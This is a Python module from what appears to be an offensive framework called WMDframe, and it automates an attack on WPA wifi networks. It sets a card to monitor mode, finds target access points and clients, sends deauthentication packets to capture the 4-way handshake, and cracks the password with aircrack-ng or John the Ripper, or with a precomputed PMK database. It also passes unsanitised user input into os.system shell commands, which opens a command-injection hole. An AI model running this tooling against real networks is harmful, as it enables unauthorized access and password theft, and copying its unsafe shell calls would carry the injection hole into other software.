#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


# LIBRARIES
import configparser
import netifaces
import os
from time import sleep
try:
    import core.core as core
    import core.modules as cmodules
    import core.commands as comm
    import core.wifi as cwifi
    from core.colors import bc as bc
except:
    import sys
    sys.path.append('././')
    import core.core as core
    import core.modules as cmodules
    import core.commands as comm
    import core.wifi as cwifi
    from core.colors import bc as bc
# END LIBRARIES


config = core.config()
logger = core.log()


# VARIABLES
AIRCRACKNG_SYM = (config['TOOLS']['AIRCRACKNG_SYM'])
AIRMONNG_SYM = (config['TOOLS']['AIRMONNG_SYM'])
AIRODUMPNG_SYM = (config['TOOLS']['AIRODUMPNG_SYM'])
AIROLIBNG_SYM = (config['TOOLS']['AIROLIBNG_SYM'])
AIREPLAYNG_SYM = (config['TOOLS']['AIREPLAYNG_SYM'])
JOHN_SYM = (config['TOOLS']['JOHN_SYM'])
INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])
INTERFACE_MON = (config['NETWORK']['INTERFACE_MON'])
# END VARIABLES


# OPTIONS
class options():
    Author = 'Thomas TJ (TTJ)'
    Name = 'Crack WPA 4-way handshake'
    Call = 'crackwpa'
    Modulename = 'crack_wpa'
    Category = 'cracking'
    Type = 'wpa'
    Version = '0.1'
    License = 'MIT'
    Description = 'Gather WPA 4-way handshake from accesspoint and crack it'
    Datecreation = '2017/01/01'
    Lastmodified = '2017/01/01'

    def __init__(self, INTERFACE_MON, passfile, logfile, bssid, client, channel):
        self.int_mon = INTERFACE_MON
        self.passfile = passfile
        self.logfile = logfile
        self.bssid = bssid
        self.client = client
        self.channel = channel
        self.show_all()

    # Possible options
    def poss_opt(self):
        return ('int_mon', 'passfile', 'logfile', 'bssid', 'client', 'channel')

    # Show options
    def show_opt(self):
        print(
            ''
            + '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 6, 'RQ', 15, 'VALUE', 'DESCRIPTION')) + bc.ENDC
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 6, '--', 15, '-----', '-----------'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'int_mon:', 6, 'y', 15, self.int_mon, 'WIFI device which can goto to monitor mode'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'passfile:', 6, 'y', 15, self.passfile, 'Passwordlist'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'logfile:', 6, 'y', 15, self.logfile, 'Logfile for captured packages'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 6, '--', 15, '-----', '-----------'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'bssid:', 6, 'n', 15, self.bssid, 'Optional: BSSID for taget AP'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'client:', 6, 'n', 15, self.client, 'Optional: Set STATION for client'))
            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'channel:', 6, 'n', 15, self.channel, 'Optional: Set channel for AP'))
            + '\n'
            )

    # Show commands
    def show_commands(self):
        print(
            ''
            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
            + '\n\t' + '---------'
            + '\n\t' + ('%-*s ->\t%s' % (14, 'run', 'Run the script'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'setc [channel]', 'Problems with your monitoring device on wrong channel?'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'wifi', 'Show WIFI\'s'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'clients', 'Show connected clients, requires: [AP BSSID] [AP CHANNEL]'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'clientslog', 'Show connected clients and logs handshake to logfile, requires: [AP BSSID] [AP CHANNEL] [LOGFILE]'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'deauth', 'Deauth client from AP, requires: [AP BSSID] [CLIENT BSSID]'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'cracka', 'Cracks WPA with aircrack and specified options'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'crackj', 'Cracks WPA with john and specified options, requires [AP BSSID]'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'precom', 'Pre-compute PMK against ESSID into database for faster cracking'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'info', 'Information'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'so', 'Show options'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'sa', 'Show module info'))
            + '\n\t' + ('%-*s ->\t%s' % (14, 'exit', 'Exit'))
            + '\n'
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


# RUN
def run():
    i_bssid = sop.bssid
    i_channel = sop.channel
    i_client = sop.client
    print('')
    # Set device in monitor mode
    tmpInt = cwifi.checkDeviceMon(sop.int_mon)
    if not tmpInt:
        tmpInt = INTERFACE_MON
        print(bc.FAIL + '\t[-]  Device not found.. Exiting..' + bc.ENDC)
        return None
    else:
        defineMon(tmpInt)
        print(bc.OKGREEN + '\t[+]  Device set to: ' + tmpInt + bc.ENDC)
        os.system(cwifi.setDeviceMon(sop.int_mon, i_channel))
        sleep(0.5)

    # Find wifis
    print('\n\t[*]  Starting xterm showing WIFI\'s')
    print('\t[!]  Locate the BSSID and channel for target accesspoint')
    print('\t[!]  Freeze the display in new xterm with "Ctrl+c"')
    comm.runCommand(cwifi.showWifis(sop.int_mon), 'FIND_WIFI')
    sleep(0.5)

    # Find clients
    print('\n\t[!]  Insert the BSSID and channel for target')
    while not i_bssid:
        i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
    while not i_channel:
        i_channel = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert channel:' + bc.ENDC + ' ')
    print('\t[*]  Starting xterm showing client\'s')
    print('\t[!]  Locate the BSSID for the client connected to the target accesspoint')
    print('\t[!]  Freeze the display in new xterm with "Ctrl+c"')
    comm.runCommand2(cwifi.showConnClients(sop.int_mon, i_bssid, i_channel, ''), 'Find_CLIENTS')
    sleep(0.5)

    # Deauth client
    print('\n\t[!]  Insert the STATION for clieng on target AP')
    while not i_client:
        i_client = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert client STATION:' + bc.ENDC + ' ')
    print('\t[*]  Starting xterm for monitoring when 4-way handshake is recived')
    print('\t[!]  When handshake is recived, it\'ll be shown in top right corner')
    print('\t[!]  Close the xterm when the handshake is recived')
    comm.runCommand2(cwifi.showConnClients(sop.int_mon, i_bssid, i_channel, sop.logfile), 'MONITORING_HANDSHAKE')
    print('\t[*]  Starting deauthing client')
    gotWPA = 'd'
    while gotWPA.lower() == 'd':
        os.system(cwifi.deauthClient(sop.int_mon, i_bssid, i_client, '1'))
        print('\t[!]  Deauth with 1 package done. Got the handshake in the monitoring xterm?')
        gotWPA = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + '(d)eauth again or (c)ontinue:' + bc.ENDC + ' ')

    # Start cracking
    print('\n\t[*]  Getting ready to crack tha biatch')
    gotFile = 'n'
    while gotFile.lower() == 'n':
        if not os.path.isfile(sop.logfile + '-01.cap'):
            if not os.path.isfile(sop.logfile):
                print('\t[*]  Can\'t locate saved logfile. It has might changes suffix.')
                print('\t[*]  Looking for something like: ' + sop.logfile)
                print('\t[*]  Doing a "ls" for you - see it? Else you gotta find it yourself..')
                os.system('ls logs')
                cusFile = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'Full filepath to logfile:' + bc.ENDC + ' ')
                if os.path.isfile(cusFile):
                    gotFile = 'y'
                    setattr(sop, 'logfile', cusFile)
                else:
                    print(bc.WARN + '\t[-]  The specified file does not exist!'  + bc.ENDC)
            else:
                gotFile = 'y'
        else:
            gotFile = 'y'
            setattr(sop, 'logfile', (sop.logfile + '-01.cap'))

    crackSW = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'Use only (a)ircrack or supply with (j)ohn:' + bc.ENDC + ' ')
    print('\t[*]  Starting cracking in 0.5 seconds\n')
    sleep(0.5)
    if crackSW.lower() == 'j':
        print('\t[!]  Stop it by pressing "Ctrl+c"')
        print('\t[!]  To restore the crack run \'john --restore=sop.logfile | aircrack-ng -b ' + i_bssid + ' -w - ' + sop.logfile + '\'')
        sleep(2)
        os.system(cwifi.crackWPAj(sop.logfile, sop.passfile, i_bssid, sop.logfile))
        print('\t[!]  To restore the crack run \'john --restore=sop.logfile | aircrack-ng -b ' + i_bssid + ' -w - ' + sop.logfile + '\'')
    else:
        os.system(cwifi.crackWPAa(sop.passfile, sop.logfile))

# END


def defineMon(interface):
    setattr(sop, 'int_mon', interface)


def setc(channel):
    tmpInt = cwifi.checkDeviceMon(sop.int_mon)
    if tmpInt:
        defineMon(tmpInt)
        print('')
        os.system(cwifi.setDeviceMon(sop.int_mon, channel))
        print('')


def wifi():
    tmpInt = cwifi.checkDeviceMon(sop.int_mon)
    if tmpInt:
        defineMon(tmpInt)
        comm.runCommand(cwifi.showWifis(sop.int_mon), 'WIFIs')
        print('')


def cracka():
    print('')
    print('\t[*]  Starting cracking in 0.5 seconds\n')
    os.system(cwifi.crackWPAa(sop.passfile, sop.logfile))
    print('')


def crackj():
    print('')
    i_bssid = sop.bssid
    while not i_bssid:
        i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
    print('\t[*]  Starting cracking in 0.5 seconds\n')
    os.system(cwifi.crackWPAj(sop.logfile, sop.passfile, i_bssid, sop.logfile))
    print('')


def clients():
    tmpInt = cwifi.checkDeviceMon(sop.int_mon)
    if tmpInt:
        defineMon(tmpInt)
        print('')
        i_bssid = sop.bssid
        i_channel = sop.channel
        print('\n\t[!]  Insert the BSSID and channel for target')
        while not i_bssid:
            i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
        while not i_channel:
            i_channel = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert channel:' + bc.ENDC + ' ')
        print('\t[*]  Starting xterm showing client\'s')
        print('\t[!]  Locate the BSSID for the client connected to the target accesspoint')
        print('\t[!]  Freeze the display in new xterm with "Ctrl+c"')
        comm.runCommand2(cwifi.showConnClients(sop.int_mon, i_bssid, i_channel, ''), 'Find_CLIENTS')
        print('')


def clientslog():
    tmpInt = cwifi.checkDeviceMon(sop.int_mon)
    if tmpInt:
        defineMon(tmpInt)
        print('')
        i_bssid = sop.bssid
        i_channel = sop.channel
        i_logfile = sop.logfile
        if i_logfile:
            print('\t[*]  Using logfile:' + str(i_logfile))
        print('\n\t[!]  Insert the BSSID and channel for target')
        while not i_bssid:
            i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
        while not i_channel:
            i_channel = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert channel:' + bc.ENDC + ' ')
        while not i_logfile:
            i_logfile = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert channel:' + bc.ENDC + ' ')
        print('\t[*]  Starting xterm showing client\'s')
        print('\t[!]  Locate the BSSID for the client connected to the target accesspoint')
        print('\t[!]  Freeze the display in new xterm with "Ctrl+c"')
        comm.runCommand2(cwifi.showConnClients(sop.int_mon, i_bssid, i_channel, i_logfile), 'MONITORING_HANDSHAKE')
        print('')


def deauth():
    tmpInt = cwifi.checkDeviceMon(sop.int_mon)
    if tmpInt:
        defineMon(tmpInt)
        print('')
        i_bssid = sop.bssid
        i_client = sop.client
        print('\n\t[!]  Insert the BSSID and channel for target')
        while not i_bssid:
            i_bssid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert BSSID:' + bc.ENDC + ' ')
        while not i_client:
            i_client = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert client STATION:' + bc.ENDC + ' ')
        print('\t[*]  Starting deauthing client')
        gotWPA = 'd'
        while gotWPA.lower() == 'd':
            os.system(cwifi.deauthClient(sop.int_mon, i_bssid, i_client, '1'))
            print('\t[!]  Deauth with 1 package done. Got the handshake in the monitoring xterm?')
            gotWPA = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + '(d)eauth again or (e)nd:' + bc.ENDC + ' ')


def pmkDB():
    print('')
    i_essid = None
    i_db = None
    i_pwdlst = None
    i_capfile = None
    i_clean = None
    while not i_essid:
        i_essid = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert ESSID:' + bc.ENDC + ' ')
    while not i_db:
        i_db = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert PMK database name (saved in tmp):' + bc.ENDC + ' ')
    i_db = 'tmp/' + i_db
    print('\t[*]  Importing essid to DB')
    os.system('echo ' + i_essid + ' | ' + AIROLIBNG_SYM + ' ' + i_db + ' --import essid -')
    while not i_pwdlst:
        i_pwdlst = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert path to PWD list:' + bc.ENDC + ' ')
    print('\t[*]  Importing PWDs to DB')
    os.system(AIROLIBNG_SYM + ' ' + i_db + ' --import passwd ' + i_pwdlst)
    while not i_clean:
        i_clean = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'clean DB before batch? (y/N):' + bc.ENDC + ' ')
        if i_clean == 'y':
            print('\t[*]  Cleaning DB')
            os.system(AIROLIBNG_SYM + ' ' + i_db + ' --clean all')
    print('\t[*]  Running batch - can be slow!')
    os.system(AIROLIBNG_SYM + ' ' + i_db + ' --batch')
    print('\t[*]  Checking stats')
    os.system(AIROLIBNG_SYM + ' ' + i_db + ' --stats')
    print('')
    sleep(2)
    while not i_capfile:
        i_capfile = input('     -> ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'insert path to CAP file:' + bc.ENDC + ' ')
    print('\t[*]  Running crack')
    sleep(2)
    os.system(AIRCRACKNG_SYM + ' -r ' + i_db + ' -e ' + i_essid + ' ' + i_capfile)


def info():
    print("""
        Module for use in WMDframe.

        For info about computing PMK see: https://www.aircrack-ng.org/doku.php?id=airolib-ng
        """)


# CONSOLE
def console():
    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'crackWPA:' + bc.ENDC + ' ')
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'wifi' in userinput[:1]:
        wifi()
    elif 'deauth' in userinput[:1]:
        deauth()
    elif 'clients' in userinput[:1]:
        clients()
    elif 'clientslog' in userinput[:1]:
        clientslog()
    elif 'cracka' in userinput[:1]:
        cracka()
    elif 'crackj' in userinput[:1]:
        crackj()
    elif 'precom' in userinput[:1]:
        pmkDB()
    elif 'setc' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        setc(useroption)
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')
        if useroption not in sop.poss_opt():
            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    elif ':' in userinput[:1]:
        print('')
        os.system(str(value[1:]))
        print('')
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
    console()
# END console


# STARTER
def main():
    print('\n')
    print('\t   ______                __      _       ______  ___   ')
    print('\t  / ____/________ ______/ /__   | |     / / __ \/   |  ')
    print('\t / /   / ___/ __ `/ ___/ //_/   | | /| / / /_/ / /| |  ')
    print('\t/ /___/ /  / /_/ / /__/ ,<      | |/ |/ / ____/ ___ |  ')
    print('\t\____/_/   \__,_/\___/_/|_|     |__/|__/_/   /_/  |_|  ')
    print('\n')
    if os.getuid() != 0:
        print('r00tness is needed due to interface modeling!')
        print('Run the script again as root/sudo')
        return None
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    tmpInt = cwifi.checkDeviceMon(INTERFACE_MON)
    if not tmpInt:
        tmpInt = INTERFACE_MON
        print(bc.FAIL + '\t[-]  Device not found.. Setting it to: ' + tmpInt + bc.ENDC)
    else:
        print(bc.OKGREEN + '\t[+]  Device set to: ' + tmpInt + bc.ENDC)
    comm.checkInstalled(AIRCRACKNG_SYM)
    comm.checkInstalled(AIRMONNG_SYM)
    comm.checkInstalled(AIRODUMPNG_SYM)
    comm.checkInstalled(AIREPLAYNG_SYM)
    comm.checkInstalledOpt(AIROLIBNG_SYM)
    comm.checkInstalledOpt(JOHN_SYM)
    print('\n')
    global sop
    sop = options(INTERFACE_MON, 'files/pwd_john.txt', 'logs/wifidata', '', '', '')
    console()
